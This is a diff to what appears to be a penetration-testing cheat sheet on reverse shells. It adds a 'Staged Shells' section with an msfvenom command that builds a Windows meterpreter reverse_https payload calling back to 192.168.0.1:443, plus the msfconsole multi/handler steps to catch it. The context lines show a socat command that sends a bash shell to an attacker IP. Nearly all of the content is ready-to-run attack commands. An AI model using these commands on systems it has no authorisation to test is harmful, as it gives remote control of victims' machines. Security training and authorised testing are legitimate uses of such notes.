@@ -127,3 +127,29 @@ Send shell from target machine
 ```bash
 socat TCP4:<attacker IP>:443, verify=0 EXEC:/bin/bash
 ```
+
+## Staged Shells
+Leverage `msfvenom` to create our staged payload
+```bash
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 -f exe -o msfstaged.exe
+```
+Now prepare the handler, not quite as simple as creating a netcat listener this time around!
+```bash
+sudo msfconsole -q
+```
+```bash
+use multi/handler
+```
+```bash
+set payload windows/x64/meterpreter/reverse_https
+```
+Unlike with a simple listener we're now creating a two stage payload, therefore weirdly the listener also has to have awareness of the attacker machine, since it is responsible for delivering a secondary payload into which this information will need to be fed.
+```bash
+set lhost 192.168.0.1
+```
+```bash
+set lport 443
+```
+```bash
+exploit
+```
